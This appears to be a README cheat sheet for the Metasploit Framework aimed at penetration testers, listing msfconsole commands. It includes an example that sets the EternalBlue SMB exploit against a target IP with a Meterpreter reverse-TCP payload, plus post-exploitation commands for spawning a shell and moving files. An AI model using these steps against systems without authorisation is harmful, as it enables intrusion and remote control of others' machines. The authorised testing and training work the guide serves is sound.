# 🔥 Metasploit Quick Guide
<p align="center">
  <img src="https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=hackthebox" />
  <img src="https://img.shields.io/badge/Focus-Penetration%20Testing-red?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Level-Beginner%20to%20Pro-black?style=for-the-badge" />
</p>

---

## 📌 Overview
This repository provides a **quick reference guide** for using the Metasploit Framework in real-world penetration testing scenarios.

---

## ⚙️ What is Metasploit?
Metasploit is a powerful framework used for:
- 🔍 Vulnerability Scanning  
- 💣 Exploitation  
- 📦 Payload Delivery  
- 🧠 Post Exploitation  

---

## 🚀 Getting Started

### Start Metasploit
```bash
msfconsole
Update Framework
msfupdate
🔍 Searching Modules
search <keyword>
search type:exploit platform:windows

Example:

search smb
⚙️ Using Modules
use <module_path>

Example:

use exploit/windows/smb/ms17_010_eternalblue
Show Options
show options
🎯 Target Configuration
set RHOSTS <target_ip>
set LHOST <your_ip>
set LPORT <port>

Example:

set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set LPORT 4444
💣 Running Exploits
run

or

exploit
📦 Payload Management
Show Payloads
show payloads
Set Payload
set PAYLOAD windows/meterpreter/reverse_tcp
🖥️ Meterpreter Cheat Sheet
sysinfo        # System information
getuid         # Current user
shell          # Spawn shell
pwd            # Current directory
ls             # List files
download file  # Download file
upload file    # Upload file
🔐 Post Exploitation
background        # Background session
sessions          # List sessions
sessions -i <id>  # Interact with session
